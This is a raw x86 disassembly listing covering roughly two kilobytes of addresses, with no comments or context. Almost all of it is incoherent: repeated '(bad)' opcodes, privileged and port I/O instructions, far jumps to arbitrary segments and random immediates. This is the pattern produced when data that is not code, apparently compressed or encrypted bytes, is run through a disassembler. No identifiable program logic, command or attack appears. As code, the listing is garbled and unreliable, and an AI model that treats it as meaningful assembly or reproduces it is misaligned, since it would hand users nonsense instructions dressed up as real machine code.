  4125b2:	jg     0x41257c
  4125b4:	repz stc 
  4125b6:	(bad)  
  4125b7:	(bad)  
  4125b8:	test   BYTE PTR [ecx+edi*4+0x7a],bl
  4125bc:	fnstsw WORD PTR [ebx+0x2e2c9b61]
  4125c2:	jge    0x412553
  4125c4:	test   ebx,ebp
  4125c6:	(bad)  
  4125c7:	push   cs
  4125c8:	or     dh,BYTE PTR [edi]
  4125ca:	cmp    BYTE PTR ds:0x815a1ce2,dl
  4125d0:	stos   BYTE PTR es:[edi],al
  4125d1:	cmp    eax,0xd02bd16
  4125d6:	xor    BYTE PTR [edi],0xe7
  4125d9:	cs (bad) 
  4125db:	int    0xc0
  4125dd:	add    edx,esp
  4125df:	push   ebp
  4125e0:	push   es
  4125e1:	inc    esp
  4125e2:	sti    
  4125e3:	loopne 0x412590
  4125e5:	jle    0x41256a
  4125e7:	mov    eax,ds:0xadd27a65
  4125ec:	mov    esp,0x3c723a55
  4125f1:	rcr    edx,0x98
  4125f4:	lea    eax,[ebx+0x2c96fd76]
  4125fa:	pushf  
  4125fb:	les    eax,FWORD PTR [edx-0xb0c98ff]
  412601:	aaa    
  412602:	push   ebp
  412603:	jnp    0x412648
  412605:	mov    ah,0x73
  412607:	pop    esp
  412608:	sub    eax,0x75a71251
  41260d:	ins    BYTE PTR es:[edi],dx
  41260e:	(bad)  
  41260f:	call   0xa9155497
  412614:	test   eax,0x99e1bab8
  412619:	pop    ebp
  41261a:	clc    
  41261b:	repz pop esi
  41261d:	and    edx,edx
  41261f:	outs   dx,DWORD PTR ds:[esi]
  412620:	shl    BYTE PTR [ecx],1
  412622:	aam    0xa9
  412624:	or     ecx,edx
  412626:	inc    edi
  412627:	or     DWORD PTR [ecx-0x73],edi
  41262a:	sbb    al,0xc1
  41262c:	data16 out dx,al
  41262e:	rol    BYTE PTR [edx-0x6cfcdacf],0x14
  412635:	loop   0x412604
  412637:	je     0x412656
  412639:	fs ja  0x41269f
  41263c:	adc    BYTE PTR [ebx-0x772451a7],ch
  412642:	add    al,BYTE PTR [ebx+0x3a823bf3]
  412648:	test   eax,0x8d6cf821
  41264d:	hlt    
  41264e:	lahf   
  41264f:	fidivr DWORD PTR [edi+0x3c]
  412652:	int3   
  412653:	gs loopne 0x4126d0
  412656:	cld    
  412657:	mov    ecx,0x10bfa471
  41265c:	mov    dh,0xc9
  41265e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41265f:	loop   0x412611
  412661:	daa    
  412662:	aas    
  412663:	fwait
  412664:	adc    esp,edx
  412666:	daa    
  412667:	lods   eax,DWORD PTR ds:[esi]
  412668:	jno    0x412602
  41266a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41266b:	call   0xe15d70e4
  412670:	imul   edi,DWORD PTR [esi],0xffffffaf
  412673:	jmp    0xdd42:0x70ea5b1a
  41267a:	ins    BYTE PTR es:[edi],dx
  41267b:	fsub   QWORD PTR [ebx]
  41267d:	push   ebp
  41267e:	dec    esp
  41267f:	call   0xd36309ae
  412684:	add    al,BYTE PTR [edi+esi*2+0x616c63fe]
  41268b:	fimul  DWORD PTR [eax+0x26]
  41268e:	cmp    ebp,DWORD PTR [ebx+0x20789016]
  412694:	lods   al,BYTE PTR ds:[esi]
  412695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412696:	add    BYTE PTR [esi-0x71],cl
  412699:	retf   0x66d9
  41269c:	dec    edx
  41269d:	mov    ?,WORD PTR [eax+0x660dfa30]
  4126a3:	out    dx,al
  4126a4:	sub    eax,0xc4df781f
  4126a9:	fidiv  WORD PTR [edi+0x5b]
  4126ac:	xchg   edx,eax
  4126ad:	(bad)  
  4126af:	imul   esp,DWORD PTR [edx+0xe],0x4d
  4126b3:	and    BYTE PTR [esp+eiz*8-0x65],cl
  4126b7:	jmp    0x8f84:0x7c24d9ee
  4126be:	cwde   
  4126bf:	sahf   
  4126c0:	pop    ecx
  4126c1:	stos   BYTE PTR es:[edi],al
  4126c2:	sbb    ebp,DWORD PTR [eax]
  4126c4:	mov    esi,0x7b06f319
  4126c9:	rcl    DWORD PTR [edi],cl
  4126cb:	jne    0x4126c1
  4126cd:	inc    ecx
  4126ce:	jmp    0xde79fc48
  4126d3:	rcr    al,cl
  4126d5:	in     eax,0xe8
  4126d7:	aad    0x2a
  4126d9:	mov    ebx,ecx
  4126db:	repnz ins BYTE PTR es:[edi],dx
  4126dd:	cmp    eax,DWORD PTR [ebp+ebx*2+0x6f9d8bd9]
  4126e4:	ror    edx,0xe4
  4126e7:	mov    eax,ds:0x7f544aa0
  4126ec:	sub    dl,BYTE PTR [ecx-0x150b6d89]
  4126f2:	push   ebx
  4126f3:	dec    esi
  4126f4:	mov    ds:0x877223f7,eax
  4126f9:	push   ds
  4126fa:	adc    BYTE PTR [ecx+ebp*4-0x3e],dh
  4126fe:	add    eax,0x2b35ab41
  412703:	xchg   DWORD PTR [eax-0x3bbd2bd7],ebp
  412709:	push   0xffffffb7
  41270b:	clc    
  41270c:	outs   dx,DWORD PTR ds:[esi]
  41270d:	ja     0x412695
  41270f:	mov    BYTE PTR [si-0x3dbe],dh
  412714:	pushf  
  412715:	mov    BYTE PTR [ebp+0x45],al
  412718:	outs   dx,BYTE PTR ds:[esi]
  412719:	adc    DWORD PTR [eax+0x75e16d76],ebx
  41271f:	xor    DWORD PTR [edx+0x58],0x4d
  412723:	dec    DWORD PTR [edi-0x47b293]
  412729:	mov    ch,0xe3
  41272b:	sub    ebx,DWORD PTR ss:[eax+0x62]
  41272f:	jle    0x4126ba
  412731:	ret    0xac26
  412734:	js     0x4126fd
  412736:	inc    ebp
  412737:	hlt    
  412738:	cmp    DWORD PTR [ebp+0x45c7f89c],eax
  41273e:	mov    esp,0xf89c853a
  412743:	jmp    0x4129cb
  412748:	int    0xcb
  41274a:	ror    esp,0xd9
  41274d:	fcmove st,st(5)
  41274f:	leave  
  412750:	sub    al,0xaa
  412752:	(bad)  
  412754:	(bad)  
  412755:	jmp    0x6ceb8792
  41275a:	js     0x4127d4
  41275c:	in     eax,0x7e
  41275e:	js     0x4127d8
  412760:	adc    DWORD PTR [esi-0x33d28e7b],esi
  412766:	ds aas 
  412768:	stos   DWORD PTR es:[edi],eax
  412769:	cmp    eax,0xb15edd97
  41276e:	test   DWORD PTR [eax-0x6c30ddac],ebx
  412774:	dec    ecx
  412775:	sbb    eax,0xdb0078c0
  41277a:	(bad)  
  41277b:	mov    edi,0x670eb92b
  412780:	leave  
  412781:	std    
  412782:	fimul  DWORD PTR cs:[ecx-0x6d5ec470]
  412789:	fs int3 
  41278b:	sbb    DWORD PTR [ebp+0x37c5f595],ecx
  412791:	shr    BYTE PTR [eax-0x1d2650c3],cl
  412797:	jge    0x4127a2
  412799:	sbb    BYTE PTR [ecx],ch
  41279b:	call   0xfa1e:0x632d26bf
  4127a2:	leave  
  4127a3:	popf   
  4127a4:	ja     0x41280b
  4127a6:	pop    ecx
  4127a7:	or     DWORD PTR [eax-0x20424179],0x4
  4127ae:	daa    
  4127af:	cmp    BYTE PTR [ebp-0x4c634624],0xce
  4127b6:	adc    ecx,ebp
  4127b8:	retf   0xc633
  4127bb:	pusha  
  4127bc:	pop    edx
  4127bd:	jne    0x412784
  4127bf:	inc    edx
  4127c0:	fwait
  4127c1:	icebp  
  4127c2:	add    BYTE PTR [edi-0x66],al
  4127c5:	xchg   esi,eax
  4127c6:	push   cs
  4127c7:	outs   dx,DWORD PTR ds:[esi]
  4127c8:	add    cl,ah
  4127ca:	pop    eax
  4127cb:	outs   dx,BYTE PTR ds:[esi]
  4127cc:	xchg   al,cl
  4127ce:	or     al,0x4e
  4127d0:	aas    
  4127d1:	out    dx,al
  4127d2:	xor    DWORD PTR fs:[esi],ebx
  4127d5:	out    0x83,al
  4127d7:	push   ds
  4127d8:	into   
  4127d9:	fwait
  4127da:	jl     0x412825
  4127dc:	test   eax,0x27860a9a
  4127e1:	mov    esp,0x5072537c
  4127e6:	pop    ebp
  4127e7:	sub    DWORD PTR [edi],0xfffffff6
  4127ea:	push   esi
  4127eb:	jecxz  0x4127ef
  4127ed:	daa    
  4127ee:	push   0xfbcba5ba
  4127f3:	jge    0x412848
  4127f5:	push   ebp
  4127f6:	sbb    eax,0xbb052393
  4127fb:	lods   eax,DWORD PTR ds:[esi]
  4127fc:	xor    DWORD PTR [ebp-0xb],ebx
  4127ff:	push   edi
  412800:	add    al,0x7c
  412802:	out    dx,eax
  412803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412804:	pop    ds
  412805:	push   ebp
  412806:	and    eax,0xb93b2813
  41280b:	stc    
  41280c:	int    0xba
  41280e:	outs   dx,BYTE PTR fs:[esi]
  412810:	xchg   edx,eax
  412811:	jp     0x412797
  412813:	stos   DWORD PTR es:[edi],eax
  412814:	sahf   
  412815:	imul   eax,DWORD PTR [edi+ebx*1],0xffffffcf
  412819:	fbstp  TBYTE PTR [bp-0x2638]
  41281e:	out    0xb8,al
  412820:	push   es
  412821:	push   edx
  412822:	or     al,0xed
  412824:	cmp    eax,0x34c0b6cf
  412829:	sub    dl,cl
  41282b:	repz sar al,1
  41282e:	and    BYTE PTR [eax+0x36],ch
  412831:	call   0x2357:0xef4fcd12
  412838:	test   DWORD PTR [ebp+0x7c],ebx
  41283b:	int    0x17
  41283d:	gs pop ebp
  41283f:	sub    DWORD PTR [ebp+0x25],edi
  412842:	mov    dl,0xc5
  412844:	or     eax,0x8332ee2c
  412849:	inc    eax
  41284a:	out    dx,al
  41284b:	pushf  
  41284c:	jo     0x41280c
  41284e:	sub    BYTE PTR [edi],ch
  412850:	xchg   esp,eax
  412851:	xlat   BYTE PTR ds:[ebx]
  412852:	jecxz  0x412871
  412854:	(bad)  
  412855:	ficomp WORD PTR [ebx+0x1422f17]
  41285b:	and    eax,DWORD PTR [esi-0x52]
  41285e:	pop    edi
  41285f:	xchg   DWORD PTR [eax],edi
  412861:	sbb    bl,bh
  412863:	call   0x7bef:0x60a9da4f
  41286a:	or     DWORD PTR [eax],0x7b
  41286d:	and    eax,edi
  41286f:	xchg   ebp,eax
  412870:	(bad)  
  412871:	test   al,0xf2
  412873:	sbb    al,0x19
  412875:	push   ebx
  412876:	lods   al,BYTE PTR ds:[esi]
  412877:	scas   al,BYTE PTR es:[edi]
  412878:	or     DWORD PTR [ebp+ebp*1-0x1c],eax
  41287c:	inc    esi
  41287d:	loopne 0x4128e2
  41287f:	adc    cl,BYTE PTR [edi]
  412881:	mov    bh,0x90
  412883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412884:	jae    0x412807
  412886:	enter  0x5b2a,0x85
  41288a:	jmp    0xdd43:0x46e97159
  412891:	test   al,0x6
  412893:	ret    0xcddf
  412896:	mov    dh,0x13
  412898:	jo     0x412910
  41289a:	jl     0x41290b
  41289c:	pop    ss
  41289d:	cwde   
  41289e:	ins    DWORD PTR es:[edi],dx
  41289f:	inc    edi
  4128a0:	mov    al,0xbe
  4128a2:	mov    esi,DWORD PTR [ebx+0x115aa79d]
  4128a8:	sbb    esp,ebx
  4128aa:	fst    QWORD PTR [esi-0xc]
  4128ad:	add    edi,0x25ae91e4
  4128b3:	sub    ah,BYTE PTR [eax+0x4262547f]
  4128b9:	mov    dl,0xc3
  4128bb:	adc    BYTE PTR [esi+0xa860328],bl
  4128c1:	push   ds
  4128c2:	repnz mov esi,ebx
  4128c5:	inc    eax
  4128c6:	mov    bh,0x63
  4128c8:	sub    DWORD PTR ss:[esi],esp
  4128cb:	push   esp
  4128cc:	es push ebp
  4128ce:	bound  edx,QWORD PTR [eax-0x3a4cd98]
  4128d4:	call   0xce30:0xd3fcfde4
  4128db:	push   0xfffffff5
  4128dd:	xlat   BYTE PTR ds:[ebx]
  4128de:	add    eax,0xa8a14dda
  4128e3:	fld    DWORD PTR [edi+0x4b482172]
  4128e9:	(bad)  
  4128ea:	mov    ebx,0xebccd97d
  4128ef:	jbe    0x4128af
  4128f1:	sub    eax,0xf6a4754c
  4128f6:	or     al,0x5f
  4128f8:	scas   eax,DWORD PTR es:[edi]
  4128f9:	sar    edi,1
  4128fb:	push   ecx
  4128fc:	mov    DWORD PTR [eax-0x2b],0x7bc13af5
  412903:	sbb    ebp,ebp
  412905:	cmp    bh,BYTE PTR [eax+eax*8]
  412908:	xor    dl,BYTE PTR [edx]
  41290a:	sub    DWORD PTR [ebx+0x5c],edx
  41290d:	out    0x4e,eax
  41290f:	sbb    eax,ecx
  412911:	jnp    0x412965
  412913:	push   0x3a
  412915:	push   edi
  412916:	enter  0xd56a,0xc4
  41291a:	mov    DWORD PTR [ebx-0x10],edi
  41291d:	xor    al,0x23
  41291f:	mov    bl,0x1c
  412921:	(bad)  
  412922:	fisub  DWORD PTR [edx+ebx*1+0x3e562478]
  412929:	fwait
  41292a:	ins    DWORD PTR es:[edi],dx
  41292b:	jle    0x4129a2
  41292d:	jno    0x4128c1
  41292f:	rol    ch,cl
  412931:	sbb    esp,0x22
  412934:	jnp    0x41298d
  412936:	inc    esi
  412937:	out    dx,eax
  412938:	cmp    edx,DWORD PTR [edi+ebp*4-0x5a6fe9d8]
  41293f:	rcl    DWORD PTR [edx],0x64
  412942:	or     esp,esp
  412944:	jno    0x4128f0
  412946:	je     0x41299a
  412948:	iret   
  412949:	pop    esp
  41294a:	jle    0x412969
  41294c:	sahf   
  41294d:	jb     0x41291e
  41294f:	int3   
  412950:	lea    edx,[esi+edx*8+0x9]
  412954:	pop    ecx
  412955:	lods   al,BYTE PTR ds:[esi]
  412956:	aam    0x4d
  412958:	mov    bl,0xb6
  41295a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41295b:	aad    0x6d
  41295d:	sahf   
  41295e:	in     al,dx
  41295f:	out    dx,al
  412960:	pop    esp
  412961:	pop    ebp
  412962:	mov    ds:0xdf14d20,eax
  412967:	dec    esi
  412968:	jmp    0x41f1:0x1be6413d
  41296f:	ins    BYTE PTR es:[edi],dx
  412970:	mov    cl,0x3a
  412972:	adc    eax,0x94dd86f5
  412977:	bound  edx,QWORD PTR [esi-0x4d008954]
  41297d:	sbb    BYTE PTR [edx+0x26c8060f],ch
  412983:	pop    ebx
  412984:	mov    dl,0x80
  412986:	ds xchg edx,eax
  412988:	in     al,dx
  412989:	mov    ah,0x6a
  41298b:	cs push 0xfffffffc
  41298e:	not    BYTE PTR [eax]
  412990:	jge    0x4129f8
  412992:	pop    ds
  412993:	lods   eax,DWORD PTR ds:[esi]
  412994:	or     DWORD PTR [edx],ecx
  412996:	scas   eax,DWORD PTR es:[edi]
  412997:	pop    eax
  412998:	cmp    eax,0xfdf2b05e
  41299d:	push   ds
  41299e:	(bad)  
  41299f:	shr    al,1
  4129a1:	outs   dx,BYTE PTR ds:[esi]
  4129a2:	dec    eax
  4129a3:	cmp    al,BYTE PTR ds:0x759dca53
  4129a9:	pushf  
  4129aa:	jge    0x412a0b
  4129ac:	sbb    DWORD PTR [eax+ebp*1],ecx
  4129af:	out    0xaf,eax
  4129b1:	mov    ecx,0xb6cf4338
  4129b6:	sti    
  4129b7:	inc    ebp
  4129b8:	xchg   edi,eax
  4129b9:	mov    esi,0x2b137293
  4129be:	push   ebx
  4129bf:	scas   al,BYTE PTR es:[edi]
  4129c0:	xor    esp,DWORD PTR [ebx+0x2c]
  4129c3:	neg    DWORD PTR [ecx]
  4129c5:	pop    eax
  4129c6:	pop    edx
  4129c7:	and    edi,DWORD PTR [edx+0x558b4a34]
  4129cd:	call   0xd144fa05
  4129d2:	jmp    0x41396f
  4129d7:	mov    edx,DWORD PTR [ebp-0x18]
  4129da:	xor    edx,eax
  4129dc:	add    edx,DWORD PTR [ebp-0x14]
  4129df:	jmp    0x412c67
  4129e4:	(bad)
  4129e7:	ret    0xc1ca
  4129ea:	(bad)
  4129ed:	xlat   BYTE PTR ds:[ebx]
  4129ee:	data16 ja 0x412a50
  4129f1:	mov    bh,0x3
  4129f3:	jle    0x412a0c
  4129f5:	jno    0x412a6f
  4129f7:	js     0x4129de
  4129f9:	jle    0x412a73
  4129fb:	js     0x412a40
  4129fd:	mov    ebp,0xd27ffc04
  412a02:	jmp    0x40be:0xa47ceb9b
  412a09:	inc    edi
  412a0a:	sbb    eax,0x6aa540de
  412a0f:	loop   0x4129fd
  412a11:	jbe    0x412a2d
  412a13:	jge    0x41299d
  412a15:	or     BYTE PTR [esi],bl
  412a17:	inc    edx
  412a18:	stos   DWORD PTR es:[edi],eax
  412a19:	pop    esp
  412a1a:	jno    0x412a91
  412a1c:	aas    
  412a1d:	or     DWORD PTR [ebp-0x64],ebp
  412a20:	repz clc 
  412a22:	stos   BYTE PTR es:[edi],al
  412a23:	(bad)
  412a26:	into   
  412a27:	fs mov eax,0x5f4b9f8e
  412a2d:	clc    
  412a2e:	sub    eax,0xf271d717
  412a33:	mov    ebx,0x841d430b
  412a38:	loopne 0x4129f6
  412a3a:	mov    ebp,0x7e8b4366
  412a3f:	mov    BYTE PTR [edi],ah
  412a41:	aas    
  412a42:	lods   al,BYTE PTR ds:[esi]
  412a43:	outs   dx,DWORD PTR ds:[esi]
  412a44:	jns    0x412aab
  412a46:	xchg   esp,eax
  412a47:	sbb    DWORD PTR [bp-0x3781],0x45
  412a4d:	test   BYTE PTR [edi+0x5687f1c5],bh
  412a53:	or     DWORD PTR [edx],ebx
  412a55:	pop    edx
  412a56:	ja     0x412a51
  412a58:	mov    bh,0x7b
  412a5a:	(bad)  [ecx+edi*4+0x16957360]
  412a61:	dec    esp
  412a62:	stos   BYTE PTR es:[edi],al
  412a63:	sub    eax,0x59fdac91
  412a68:	outs   dx,DWORD PTR ds:[esi]
  412a69:	ret    
  412a6a:	cmc    
  412a6b:	xchg   ebx,eax
  412a6c:	push   es
  412a6d:	or     DWORD PTR [ebx],esp
  412a6f:	jle    0x412ae3
  412a71:	out    0xd8,al
  412a73:	in     eax,0x5b
  412a75:	ja     0x412aab
  412a77:	or     BYTE PTR [ebx],bh
  412a79:	mov    ecx,0xf2ea9c14
  412a7e:	cmc    
  412a7f:	popf   
  412a80:	stc    
  412a81:	imul   ebx,DWORD PTR [ebp+ecx*4+0x7f],0xea5c41e9
  412a89:	fistp  DWORD PTR cs:[ebx-0x399a2ad2]
  412a90:	mov    al,ds:0x842fff9
  412a95:	xchg   esp,eax
  412a96:	lea    eax,[edx]
  412a98:	test   edi,esp
  412a9a:	lods   al,BYTE PTR ds:[esi]
  412a9b:	out    dx,al
  412a9c:	(bad)  
  412a9d:	mov    ebx,edi
  412a9f:	jg     0x412a38
  412aa1:	xchg   esi,eax
  412aa2:	ret    0x86cf
  412aa5:	sti    
  412aa6:	es sbb edi,ecx
  412aa9:	ja     0x412a68
  412aab:	dec    ebp
  412aac:	scas   al,BYTE PTR es:[edi]
  412aad:	imul   esi,DWORD PTR [esi+0x74ba74f4],0xd2294bf8
  412ab7:	pandn  mm0,mm5
  412aba:	jmp    0x412ade
  412abc:	push   0xb25b3bf3
  412ac1:	fisttp WORD PTR [ebx]
  412ac3:	mov    DWORD PTR [ebx+0x46],eax
  412ac6:	stos   DWORD PTR es:[edi],eax
  412ac7:	inc    esi
  412ac8:	ret    
  412ac9:	pop    ds
  412aca:	sub    al,0x13
  412acc:	push   edx
  412acd:	leave  
  412ace:	ins    BYTE PTR es:[edi],dx
  412acf:	in     eax,dx
  412ad0:	and    al,0x4d
  412ad2:	mov    ds,WORD PTR [edi-0x31]
  412ad5:	cmp    al,0xb7
  412ad7:	add    eax,0x99d1a9d5
  412adc:	adc    eax,0x10f6da25
  412ae1:	mov    ch,BYTE PTR [eax]
  412ae3:	icebp  
  412ae4:	outs   dx,BYTE PTR ds:[esi]
  412ae5:	repz js 0x412b39
  412ae8:	inc    ebx
  412ae9:	nop
  412aea:	icebp  
  412aeb:	adc    BYTE PTR [edx-0x5b5b87e7],dl
  412af1:	and    BYTE PTR [eax+0x6bd2857e],cl
  412af7:	fs gs dec edx
  412afa:	sub    edx,eax
  412afc:	shr    DWORD PTR [ebx+0x3d],0xa3
  412b00:	fst    QWORD PTR [edx-0x48a0f8d3]
  412b06:	aam    0xf6
  412b08:	(bad)  
  412b09:	sahf   
  412b0a:	loope  0x412b61
  412b0c:	imul   esi,DWORD PTR [ebp-0x15d2f2cd],0x43980a2c
  412b16:	icebp  
  412b17:	sbb    BYTE PTR [ecx+eiz*8],bl
  412b1a:	sub    DWORD PTR [eax+0x3cc9e6d],esp
  412b20:	in     al,dx
  412b21:	and    esp,DWORD PTR [ecx-0x57684585]
  412b27:	mov    esp,0x90065dc
  412b2c:	fwait
  412b2d:	sahf   
  412b2e:	sub    eax,0xd6da86c7
  412b33:	push   ds
  412b34:	cmp    ah,BYTE PTR [edi-0x192f6700]
  412b3a:	mov    BYTE PTR [ebx+0xd396c97],ch
  412b40:	adc    al,0x2b
  412b42:	ret    0x3770
  412b45:	jns    0x412b53
  412b47:	dec    ebx
  412b48:	push   ebp
  412b49:	sub    al,0x4e
  412b4b:	jmp    0xe3d3:0x25df3f1d
  412b52:	xor    eax,DWORD PTR ds:0x826e1033
  412b58:	cld    
  412b59:	add    DWORD PTR [edx-0x60d8beaa],0xffffffd5
  412b60:	inc    ebp
  412b61:	ror    BYTE PTR [ecx-0x13],cl
  412b64:	cli    
  412b65:	cmp    BYTE PTR [edi],dl
  412b67:	loop   0x412b84
  412b69:	pop    ebp
  412b6a:	shl    dh,cl
  412b6c:	test   BYTE PTR [ecx],ah
  412b6e:	jg     0x412b28
  412b70:	adc    DWORD PTR [esi],esp
  412b72:	pop    ebx
  412b73:	in     al,0x28
  412b75:	dec    esp
  412b76:	stos   BYTE PTR es:[edi],al
  412b77:	popa   
  412b78:	sub    ecx,DWORD PTR [ecx+0x5]
  412b7b:	(bad)
  412b7e:	cmp    esp,DWORD PTR [edi+0x76]
  412b81:	adc    DWORD PTR [esi+0x2d],edx
  412b84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b85:	call   0xa55c:0x41cf8c32
  412b8c:	and    al,0x15
  412b8e:	clc    
  412b8f:	fs icebp 
  412b91:	lds    ebp,FWORD PTR [ecx-0x1a]
  412b94:	inc    edi
  412b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b96:	lods   eax,DWORD PTR ds:[esi]
  412b97:	mov    eax,DWORD PTR [edx-0x6]
  412b9a:	cmp    al,0x38
  412b9c:	add    esi,eax
  412b9e:	mov    bl,0x9
  412ba0:	inc    edi
  412ba1:	xchg   ebp,eax
  412ba2:	repz hlt 
  412ba4:	inc    ecx
  412ba5:	fidiv  DWORD PTR [eax+0x23]
  412ba8:	lahf   
  412ba9:	and    DWORD PTR [ebp-0x55d8e9a6],ebx
  412baf:	or     al,0xa4
  412bb1:	fs out 0x2e,eax
  412bb4:	mov    ds:0x1d37fc8e,eax
  412bb9:	jae    0x412b9c
  412bbb:	pop    ecx
  412bbc:	out    dx,eax
  412bbd:	cs pop eax
  412bbf:	or     dh,BYTE PTR [edi]
  412bc1:	cmp    ebp,esp
  412bc3:	jmp    0x412ba2
  412bc5:	sbb    BYTE PTR [eax],0xa7
  412bc8:	mov    esi,0x54c6a02f
  412bcd:	stos   DWORD PTR es:[edi],eax
  412bce:	fld    st(4)
  412bd0:	mov    ch,0x78
  412bd2:	mov    esp,0xeac63b7e
  412bd7:	pop    ebp
  412bd8:	loope  0x412b8f
  412bda:	or     al,0xde
  412bdc:	mov    edx,0xd77d00ca
  412be1:	xchg   BYTE PTR [esi+ebx*4],ah
  412be4:	add    dh,BYTE PTR [edx-0x60e59e40]
  412bea:	(bad)  
  412bec:	cli    
  412bed:	sub    eax,0x986f139a
  412bf2:	mov    eax,ds:0xacdc8be0
  412bf7:	ins    BYTE PTR es:[edi],dx
  412bf8:	into   
  412bf9:	pop    esi
  412bfa:	fisubr DWORD PTR [ecx]
  412bfc:	adc    BYTE PTR [ecx],bl
  412bfe:	fisub  WORD PTR [ecx+edx*2]
  412c01:	ror    DWORD PTR [esi-0x20fbd561],cl
  412c07:	xchg   ebx,eax
  412c08:	add    cl,BYTE PTR ds:[esi+0x4c6fd3c4]
  412c0f:	rcr    BYTE PTR [esi-0x30],1
  412c12:	bound  eax,QWORD PTR [ecx-0x5b]
  412c15:	cmp    BYTE PTR [ecx-0x3ee52d6a],al
  412c1b:	fdiv   DWORD PTR [ecx+0x3a]
  412c1e:	iret   
  412c1f:	(bad)
  412c22:	dec    eax
  412c23:	mov    ds:0xc38a5c9c,eax
  412c28:	call   0x565baec2
  412c2d:	iret   
  412c2e:	(bad)  
  412c2f:	push   edi
  412c30:	outs   dx,DWORD PTR ds:[esi]
  412c31:	push   ebx
  412c32:	test   al,0xa8
  412c34:	dec    edi
  412c35:	jp     0x412c4d
  412c37:	or     eax,0x4bfc39d
  412c3c:	jecxz  0x412cb8
  412c3e:	imul   edx,esi,0xc9034441
  412c44:	fwait
  412c45:	out    0xcd,eax
  412c47:	dec    ecx
  412c48:	into   
  412c49:	push   ebp
  412c4a:	(bad)  
  412c4c:	mov    WORD PTR [ecx],cs
  412c4e:	xor    eax,0xa31e22fb
  412c53:	cmp    eax,0x78e4cbe
  412c58:	fs cmp al,0xda
  412c5b:	sub    eax,0xcf52fb23
  412c60:	or     ebx,eax
  412c62:	jnp    0x412bfb
  412c64:	dec    ecx
  412c65:	push   edi
  412c66:	xchg   BYTE PTR [ebx-0x6b751b83],cl
  412c6c:	cmp    bl,BYTE PTR [eax-0x16ffcd8e]
  412c72:	add    DWORD PTR [edx],0x0
  412c75:	add    ch,cl
  412c77:	int3   
  412c78:	xlat   BYTE PTR ds:[ebx]
  412c79:	enter  0xdbd9,0xd5
  412c7d:	shl    DWORD PTR [ebx-0x62],1
  412c80:	std    
  412c81:	xchg   DWORD PTR [edx-0x4a],esp
  412c84:	mov    bl,0x49
  412c86:	cld    
  412c87:	ja     0x412d01
  412c89:	js     0x412c70
  412c8b:	jle    0x412d05
  412c8d:	js     0x412c3b
  412c8f:	jno    0x412ced
  412c91:	dec    ebp
  412c92:	lods   al,BYTE PTR ds:[esi]
  412c93:	addr16 iret 
  412c95:	jmp    0x412cea
  412c97:	push   ebx
  412c98:	ficomp WORD PTR [edi+0x6c]
  412c9b:	popf   
  412c9c:	ins    WORD PTR es:[edi],dx
  412c9e:	xchg   edi,eax
  412c9f:	or     ecx,DWORD PTR [edx+0x27a7203f]
  412ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ca6:	aaa    
  412ca7:	test   al,0x78
  412ca9:	inc    ebx
  412caa:	bound  edi,QWORD PTR [edx]
  412cac:	jb     0x412cbd
  412cae:	cli    
  412caf:	popf   
  412cb0:	or     bh,dl
  412cb2:	fadd   st,st(2)
  412cb4:	shl    BYTE PTR [eax],1
  412cb6:	icebp  
  412cb7:	retf   
  412cb8:	pop    ds
  412cb9:	fmul   QWORD PTR [ebp+0x5f]
  412cbc:	aas    
  412cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cbe:	stos   BYTE PTR es:[edi],al
  412cbf:	fdiv   st(1),st
  412cc1:	test   DWORD PTR [ecx],esi
  412cc3:	and    esp,esp
  412cc5:	adc    eax,0xee403546
  412cca:	sbb    eax,0x34365434
  412ccf:	imul   edi,esp,0xffffff8b
  412cd2:	std    
  412cd3:	loop   0x412d2f
  412cd5:	adc    BYTE PTR [edi-0x8c9c868],al
  412cdb:	cmp    cl,BYTE PTR [ecx+0x19]
  412cde:	outs   dx,BYTE PTR ds:[esi]
  412cdf:	out    0x89,eax
  412ce1:	jbe    0x412d06
  412ce3:	jbe    0x412cc3
  412ce5:	jmp    0x8a3d:0xd04544ad
  412cec:	cs pop es
  412cee:	or     esp,DWORD PTR [eax+0x13]
  412cf1:	retf   0x9c0f
  412cf4:	in     eax,dx
  412cf5:	jne    0x412ca4
  412cf7:	jmp    0xb3e8:0x7261ee72
  412cfe:	sbb    al,0x34
  412d00:	sub    DWORD PTR [ecx+eiz*4+0x58],esp
  412d04:	jmp    0xfed5:0xe8920da5
  412d0b:	jo     0x412d49
  412d0d:	xchg   esp,eax
  412d0e:	repz push esp
  412d10:	cli    
  412d11:	mov    ebx,DWORD PTR [edi-0x3a]
  412d14:	ret    0x19a1
  412d17:	mov    ecx,0xe130e31a
  412d1c:	fist   DWORD PTR [ebx+esi*4+0x4]
  412d20:	and    DWORD PTR [ebx+0x12],esi
  412d23:	cmp    al,0x61
  412d25:	sub    al,bl
  412d27:	or     eax,0x5fb5789b
  412d2c:	ins    BYTE PTR es:[edi],dx
  412d2d:	bound  ecx,QWORD PTR [ecx-0x64]
  412d30:	sbb    BYTE PTR [ecx-0x6],bh
  412d33:	jno    0x412d9c
  412d35:	mov    ch,0x56
  412d37:	ins    DWORD PTR es:[edi],dx
  412d38:	xchg   ecx,eax
  412d39:	dec    ebp
  412d3a:	dec    esi
  412d3b:	frstor [edi]
  412d3d:	mov    ds,WORD PTR [ebx-0x15ce5c1f]
  412d43:	sub    eax,0x64bb70cc
  412d48:	xor    DWORD PTR [ebp+0x1d5c1ba9],esp
  412d4e:	push   ebx
  412d4f:	mov    esp,0x7aaeae2b
  412d54:	clc    
  412d55:	in     eax,0xbf
  412d57:	call   0x9b958511
  412d5c:	in     eax,dx
  412d5d:	push   ecx
  412d5e:	std    
  412d5f:	sub    edx,0x63
  412d62:	adc    eax,0xe89ad8b2
  412d67:	cs dec esp
  412d69:	gs push eax
  412d6b:	dec    esi
  412d6c:	test   eax,esp
  412d6e:	enter  0x69d9,0x48
  412d72:	xchg   DWORD PTR [edx-0x3d],edi
  412d75:	pushf  
  412d76:	push   0xffffffcd
  412d78:	mov    cl,0x61
  412d7a:	call   0x1c443518
  412d7f:	(bad)  [esi+0x0]
